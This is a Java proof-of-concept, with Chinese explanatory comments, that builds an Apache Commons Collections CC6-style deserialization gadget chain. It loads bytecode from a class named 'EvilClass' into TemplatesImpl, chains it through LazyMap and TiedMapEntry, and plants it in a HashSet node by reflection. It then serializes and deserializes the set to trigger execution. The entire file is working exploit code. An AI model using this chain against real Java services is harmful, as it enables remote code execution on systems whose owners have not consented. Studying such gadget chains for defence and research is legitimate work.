import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class TemplateHashSetCC6 {
    public static void main(String[] args) throws Exception{
        byte[] bytes = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(templates),
                new InvokerTransformer("getOutputProperties",null, null),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //创建HashSet对象用于序列化，往map->table->node->key添加一个数据”hacker“。
        HashSet hashSet = new HashSet(1);
        hashSet.add("hacker");

        //创建LazyMap对象和TiedMapEntry对象，将TiedMapEntry对象的map属性值设置为LazyMap对象
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");


        //取出HashSet的map的table的node，node对象存储了哈希表中单个元素的数据。为什么不直接创建一个node对象？因为Node类是HashMap的静态内部类且访问权限为package-private。
        HashMap map = (HashMap) Util.getObjectFieldValue(hashSet, "map");
        Object[] table = (Object[]) Util.getObjectFieldValue(map, "table");
        Object node = table[0];
        if (node == null) {
            node = table[1];
        }

        //将node对象的key修改为TiedMapEntry对象，这里实际上就是将“hacker”修改“TiedMapEntry对象”。
        Util.setValue(node, "key", entry);

        byte[] b = Util.toSerial(hashSet);
        Util.fromSerial(b).readObject();
    }
}
